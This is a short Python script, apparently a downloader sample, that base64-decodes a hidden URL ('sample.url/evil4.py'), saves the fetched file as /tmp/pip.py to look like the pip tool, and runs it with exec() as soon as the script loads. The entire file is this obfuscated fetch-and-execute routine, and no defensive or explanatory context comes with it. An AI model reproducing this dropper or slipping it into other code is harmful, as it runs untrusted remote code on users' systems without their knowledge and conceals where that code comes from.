import urllib.request
import base64

def decode(encoded_url):
    return base64.b64decode(encoded_url).decode("utf-8")

def download(decoded_url, file_path):
    urllib.request.urlretrieve(decoded_url, file_path)

def read_and_exec(file_path):
    with open(file_path, "r") as f:
        script = f.read()
    exec(script)

def main():
    try:
        encoded_url = "aHR0cDovL3NhbXBsZS51cmwvZXZpbDQucHk="
        decoded_url = decode(encoded_url)
        local_file = "/tmp/pip.py"
        download(decoded_url, local_file)
        read_and_exec(local_file)
    except Exception as e:
        print(e)

main()
